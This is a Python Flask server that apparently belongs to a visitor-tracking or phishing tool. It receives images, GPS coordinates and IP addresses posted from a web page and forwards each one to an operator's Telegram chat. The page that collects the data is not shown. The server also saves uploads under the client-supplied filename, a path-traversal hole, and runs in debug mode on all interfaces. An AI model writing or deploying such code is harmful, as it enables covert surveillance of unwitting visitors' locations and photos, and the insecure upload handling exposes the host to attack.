from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token'
TELEGRAM_CHAT_ID = 'your_chat_id'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/data', methods=['POST'])
def handle_data():
    if request.files and 'image' in request.files:
        image = request.files['image']
        if image:
            filename = os.path.join('./uploads', image.filename)
            image.save(filename)
            send_to_telegram(f"Received image: {filename}")
            return jsonify({'status': 'success', 'type': 'image'})

    elif request.is_json:
        json_data = request.get_json()
        data_type = json_data.get('type')
        if data_type == 'location':
            latitude = json_data.get('latitude')
            longitude = json_data.get('longitude')
            send_to_telegram(f"Location: Latitude {latitude}, Longitude {longitude}")
        elif data_type == 'ip':
            ip = json_data.get('ip')
            send_to_telegram(f"IP Address: {ip}")
        return jsonify({'status': 'success', 'type': 'json'})

    return jsonify({'status': 'error', 'message': 'Invalid data received'}), 400

def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
